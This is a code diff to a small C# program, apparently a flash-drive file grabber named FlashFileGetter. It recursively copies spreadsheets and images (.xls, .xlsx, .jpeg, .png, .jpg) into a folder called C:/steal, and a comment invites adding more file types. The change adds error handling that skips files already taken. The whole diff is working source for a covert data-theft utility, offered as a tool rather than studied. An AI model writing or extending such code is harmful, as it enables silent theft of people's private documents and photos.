@@ -85,7 +85,7 @@ namespace FlashFileGetter
                 string realfilename = "";
                 string filename = fis[i].FullName;
                 string filekind = "";
-                bool isDot=false,isName = false;
+                bool isDot = false;
                 foreach (char x in filename)
                 {
                     realfilename += x.ToString();
@@ -103,7 +103,6 @@ namespace FlashFileGetter
                         filekind = "";
                         realfilename = "";
                         isDot = false;
-                        isName = true;
                     }
                 }
                 isDot = false;
@@ -114,23 +113,30 @@ namespace FlashFileGetter
                     Directory.CreateDirectory("C:/steal");
                 }
                 //自行添加规则
-                switch (filekind)
+                try
                 {
-                    case ".xls":
-                        File.Copy(filename, "C:/steal/"+realfilename);
-                        break;
-                    case ".xlsx":
-                        File.Copy(filename, "C:/steal/"+realfilename);
-                        break;
-                    case ".jpeg":
-                        File.Copy(filename, "C:/steal/" + realfilename);
-                        break;
-                    case ".png":
-                        File.Copy(filename, "C:/steal/" + realfilename);
-                        break;
-                    case ".jpg":
-                        File.Copy(filename, "C:/steal/" + realfilename);
-                        break;
+                    switch (filekind)
+                    {
+                        case ".xls":
+                            File.Copy(filename, "C:/steal/" + realfilename);
+                            break;
+                        case ".xlsx":
+                            File.Copy(filename, "C:/steal/" + realfilename);
+                            break;
+                        case ".jpeg":
+                            File.Copy(filename, "C:/steal/" + realfilename);
+                            break;
+                        case ".png":
+                            File.Copy(filename, "C:/steal/" + realfilename);
+                            break;
+                        case ".jpg":
+                            File.Copy(filename, "C:/steal/" + realfilename);
+                            break;
+                    }
+                }
+                catch (System.IO.IOException)
+                {
+                    Console.WriteLine("[提示]文件已存在，跳过复制");
                 }
             }
             DirectoryInfo[] dis = di.GetDirectories();
